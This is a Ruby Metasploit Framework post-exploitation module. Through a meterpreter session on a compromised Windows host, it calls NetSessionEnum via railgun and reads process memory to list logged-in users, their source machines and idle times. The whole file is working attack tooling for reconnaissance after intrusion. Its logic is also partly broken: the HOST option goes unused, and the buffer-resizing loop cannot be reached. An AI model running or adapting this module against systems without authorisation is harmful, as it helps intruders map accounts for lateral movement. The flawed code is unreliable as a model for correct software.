##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post


	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Windows Session Enumeration',
				'Description'   => %q{
					This module enumerates currently valid sessions on the victim host and along
					with the username and IP address from which the session came. 
				},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'Rob Fuller <mubix@hak5.org>'],
				'Version'       => '$Revision$',
				'Platform'      => [ 'windows' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))
			
			register_options(
				[
					# This is a string because I don't know of OptAddress does a lookup at runtime
					# which would fail in some cases for internal hosts
					OptString.new('HOST',	 [true, 'Target for NetSessionEnum', '']),
				], self.class)
	end
	
	def read_session_struct(startmem,count)
		base = 0
		netsessions = []
		mem = client.railgun.memread(startmem, 16*count)
		count.times{|i|
			x = {}
			cnameptr = mem[(base + 0),4].unpack("V*")[0]
			usernameptr = mem[(base + 4),4].unpack("V*")[0]
			x[:usetime] = mem[(base + 8),4].unpack("V*")[0]
			x[:idletime] = mem[(base + 12),4].unpack("V*")[0]
			x[:cname] = client.railgun.memread(cnameptr,255).split("\0\0")[0].split("\0").join
			x[:username] = client.railgun.memread(usernameptr,255).split("\0\0")[0].split("\0").join
			netsessions << x
			base = base + 16
		}
		return netsessions
	end

	def run
		client.railgun.add_function('netapi32', 'NetSessionEnum', 'DWORD',[
		['PWCHAR','servername','in'],
		['PWCHAR','UncClientName','in'],
		['PWCHAR','username','in'],
		['DWORD','level','in'],
		['PDWORD','bufptr','out'],
		['DWORD','prefmaxlen','in'],
		['PDWORD','entriesread','out'],
		['PDWORD','totalentries','out'],
		['PDWORD','resume_handle','inout']
		])


		buffersize = 500
		result = client.railgun.netapi32.NetSessionEnum(nil,nil,nil,10,4,buffersize,4,4,nil)
		if result['return'] == 5
			print_error("Access Denied when trying to access that host")
			raise Script::Completed
		elsif result['return'] == 53
			print_error("Host not found or could not be contacted")
			raise Script::Completed
		elsif result['return'] == 123
			print_error("Invalid host")
			raise Script::Completed
		elsif result['return'] == 0
			print_status("#{result['totalentries']} sessions identified")
		else
			print_status("Recieved a error code I didn't account for: #{result['return']}")
			raise Script::Completed
		end

		print_status("Finding the right buffersize...")
		while result['return'] == 234
			print_status("Tested #{buffersize}, got #{result['entriesread']} of #{result['totalentries']}")
			buffersize = buffersize + 500
			result = client.railgun.netapi32.NetSessionEnum(nil,nil,nil,10,4,buffersize,4,4,nil)
		end

		netsessions = read_session_struct(result['bufptr'],result['totalentries'])
		if netsessions.size > 0
			netsessions.each do |x|
				print_status("#{x[:username]} is logged in from #{x[:cname]} and has been idle for #{x[:idletime]} seconds")
			end
		end
	end
end

	